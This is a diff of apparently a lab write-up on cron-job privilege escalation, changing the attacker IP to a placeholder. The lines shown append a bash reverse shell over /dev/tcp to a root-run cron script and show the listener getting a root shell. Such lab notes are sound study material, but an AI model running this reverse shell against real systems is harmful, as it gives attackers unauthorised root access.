@@ -277,10 +277,10 @@ Cron jobs are liked scheduled tasks in Windows, they system wide schedule is loc
     listening on [any] 1234 ...
 
     user@debian:~$ echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
-    user@debian:~$ echo 'bash -i >& /dev/tcp/10.14.4.14/1234 0>&1' >> /usr/local/bin/overwrite.sh
+    user@debian:~$ echo 'bash -i >& /dev/tcp/a.b.c.d/1234 0>&1' >> /usr/local/bin/overwrite.sh
     user@debian:~$     
 
-    connect to [10.14.4.14] from (UNKNOWN) [10.10.73.156] 43907
+    connect to [a.b.c.d] from (UNKNOWN) [10.10.73.156] 43907
     bash: no job control in this shell
     root@debian:~# whoami
     whoami
